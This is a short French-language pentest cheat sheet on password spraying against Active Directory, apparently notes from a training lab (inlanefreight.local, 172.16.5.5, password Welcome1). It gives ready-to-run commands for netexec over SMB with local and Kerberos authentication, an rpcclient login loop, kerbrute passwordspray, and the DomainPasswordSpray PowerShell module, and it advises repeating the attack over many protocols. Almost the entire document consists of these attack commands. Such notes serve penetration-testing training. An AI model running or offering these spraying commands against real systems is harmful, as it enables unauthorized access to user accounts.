
> [!TIP]
> Tester un mot de passe pour tous les utilisateurs
>

> [!ATTENTION]
> Penser a le faire sur le plus de protocoles possibles (smb, winrm, wmi, ssh, ldap, ftp, rdp, mssql, nfs, vnc)

- [[#Depuis Linux]]
- [[#Depuis Windows]]

---
## Depuis Linux

### *NETEXEC*

```shell
nxc smb 172.16.5.5 -u valid_users.txt -p Welcome1 --continue-on-success | grep +
```

Local-auth

```shell
nxc smb 172.16.5.5 -u valid_users.txt -p Welcome1 --continue-on-success --local-auth | grep +
```

Kerberos

```shell
nxc smb 172.16.5.5 -u valid_users.txt -p Welcome1 --continue-on-success -k --kdcHost 172.16.5.5 | grep +
```

### *RPCCLIENT*

boucle for

```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### *KERBRUTE*

> [!Important]
> Attention s'arrête au premier valide

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```


---

## Depuis Windows

### *DOMAINPASSWORDSPRAY*

https://github.com/dafthack/DomainPasswordSpray

```powershell
Import-Module .\DomainPasswordSpray.ps1
```

```powershell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### *KERBRUTE*

> [!Important]
> Attention s'arrête au premier valide

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```



